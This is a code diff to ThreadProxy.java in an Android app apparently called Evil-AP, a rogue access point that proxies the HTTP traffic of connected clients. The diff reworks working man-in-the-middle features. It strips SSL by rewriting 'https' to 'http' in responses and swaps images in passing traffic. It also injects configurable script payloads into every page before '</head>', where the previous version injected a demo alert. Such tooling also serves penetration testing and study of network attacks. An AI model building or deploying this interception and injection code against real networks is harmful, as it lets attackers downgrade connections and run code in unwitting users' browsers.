@@ -3,6 +3,9 @@ package com.nibiru.evil_ap.proxy;
 import android.content.SharedPreferences;
 import android.util.Log;
 
+import com.nibiru.evil_ap.ConfigTags;
+import com.nibiru.evil_ap.SharedClass;
+
 import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -12,6 +15,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
 import java.net.Socket;
+import java.util.List;
 
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -29,16 +33,17 @@ public class ThreadProxy implements Runnable{
     private OkHttpClient okhttp;
     private InputStream imgSwap;
     private SharedPreferences mConfig;
+    private SharedClass mSharedObj;
     private boolean debug = true;
     /**************************************CLASS METHODS*******************************************/
-    ThreadProxy(Socket sClient, InputStream img, SharedPreferences config) {
+    ThreadProxy(Socket sClient, SharedPreferences config, SharedClass sharedObj) {
         this.sClient = sClient;
         rp = new OkHttpParser();
         //make client not follow redirects!
         okhttp = new OkHttpClient().newBuilder().followRedirects(false).followSslRedirects(false)
                 .build();
-        imgSwap = img;
         mConfig = config;
+        mSharedObj = sharedObj;
     }
     @Override
     public void run() {
@@ -67,10 +72,10 @@ public class ThreadProxy implements Runnable{
             //check what we are sending back
             String contentType = res.header("Content-Type");
 
-            //WE EDIT RESPONSE HERE
-            Boolean sslStrip = false, jsInject = false;
-            if( (sslStrip = mConfig.getBoolean("sslStrip", false))
-                    || (jsInject = mConfig.getBoolean("jsInject", false)) )
+            //EDIT RESPONSE HERE
+            boolean sslStrip = mConfig.getBoolean(ConfigTags.sslStrip.toString(), false);
+            boolean jsInject =  mConfig.getBoolean(ConfigTags.jsInject.toString(), false);
+            if( sslStrip || jsInject)
                 bytesBody = editBytes(bytesBody, sslStrip, jsInject);
             //prepare proper length response headers
             String headers = getResponseHeaders(res, bytesBody.length, getEtag(sRequest));
@@ -83,8 +88,8 @@ public class ThreadProxy implements Runnable{
                     && mConfig.getBoolean("imgReplace", false)){
                 //update content length
                 headers = headers.replaceAll("Content-Length:.*", "Content-Length: " +
-                        imgSwap.available());
-                streamResponse = swapImg(imgSwap, headers, streamResponse);
+                        mSharedObj.getImgDataLength());
+                streamResponse = swapImg(headers, streamResponse);
             }
             else {
                 streamResponse.write(headers.getBytes());
@@ -113,17 +118,12 @@ public class ThreadProxy implements Runnable{
         }
     }
 
-    private ByteArrayOutputStream swapImg(InputStream imgSwap,
-                                          String headers,
-                                          ByteArrayOutputStream streamResponse) throws IOException {
+    private ByteArrayOutputStream swapImg(String headers, ByteArrayOutputStream streamResponse)
+            throws IOException {
         //add header bytes to stream
         streamResponse.write(headers.getBytes());
         //add swapped image bytes to stream
-        int nRead;
-        byte[] data = new byte[8192];
-        while ((nRead = imgSwap.read(data, 0, data.length)) != -1) {
-            streamResponse.write(data, 0, nRead);
-        }
+        streamResponse.write(mSharedObj.getImgData());
         return streamResponse;
     }
 
@@ -134,9 +134,12 @@ public class ThreadProxy implements Runnable{
                 response = response.replaceAll("https", "http");
             }
             if (jsInject){
-                //INJECT !
-                response = response.replaceAll("</head>", "<script type=\"text/javascript\">" +
-                        " alert(\"Hello from Evil-AP!\"); </script></head>");
+                List<String> payloads = mSharedObj.getPayloads();
+                String full = "";
+                for(String p: payloads){
+                    full += p;
+                }
+                response = response.replaceAll("</head>", full + "</head>");
             }
             return response.getBytes();
         } catch (UnsupportedEncodingException e) {
@@ -182,7 +185,6 @@ public class ThreadProxy implements Runnable{
             while ((bytes_read = in.read(reply)) != -1) {
                 out.write(reply, 0, bytes_read);
                 out.flush();
-                //TODO CREATE YOUR LOGIC HERE
             }
             if (debug) Log.d(TAG + "[OUT]", "sent entire body!");
         } catch (IOException e) {
@@ -219,7 +221,7 @@ public class ThreadProxy implements Runnable{
         //workaround for okhttp transparent gzip
         resToClient = resToClient.replace("Transfer-Encoding: chunked",
                 "Content-Length: " + len);
-        //workaround for 304 not working
+        //workaround for 304's not working
         if (resToClient.startsWith("HTTP/1.1 304")) {
             resToClient = resToClient.replace("Connection: keep-alive", "Connection: close");
             resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
